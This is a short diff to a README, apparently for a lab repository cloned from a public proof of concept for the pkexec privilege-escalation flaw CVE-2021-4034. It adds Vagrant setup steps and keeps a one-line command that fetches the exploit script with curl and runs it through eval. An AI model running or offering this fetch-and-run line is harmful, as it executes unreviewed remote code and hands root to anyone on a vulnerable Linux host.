@@ -1,5 +1,11 @@
 I cloned [from](https://github.com/berdav/CVE-2021-4034.git)
 
+To run in vagrant after installation of vagrant run 
+```sh
+vagrant up
+vagrant ssh
+```
+
 One line command
 ```sh
 eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)"
